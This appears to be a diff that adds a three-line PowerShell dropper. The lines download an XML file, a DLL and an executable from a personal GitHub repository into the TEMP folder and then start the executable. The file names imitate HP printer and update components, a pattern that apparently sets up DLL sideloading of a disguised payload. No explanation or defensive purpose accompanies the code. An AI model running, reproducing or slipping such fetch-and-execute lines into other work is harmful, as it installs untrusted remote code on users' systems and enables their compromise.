@@ -1,0 +1,3 @@
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/ggbtty/boyDemo/raw/main/hpqhvcfg.xml' -OutFile "$env:TEMP\hpqhvcfg.xml";
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/ggbtty/boyDemo/raw/main/hpqhvsei.dll' -OutFile "$env:TEMP\hpqhvsei.dll";
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/ggbtty/boyDemo/raw/main/HPWuSchd2.exe' -OutFile "$env:TEMP\HPWuSchd2.exe"; Start-Process "$env:TEMP\HPWuSchd2.exe"
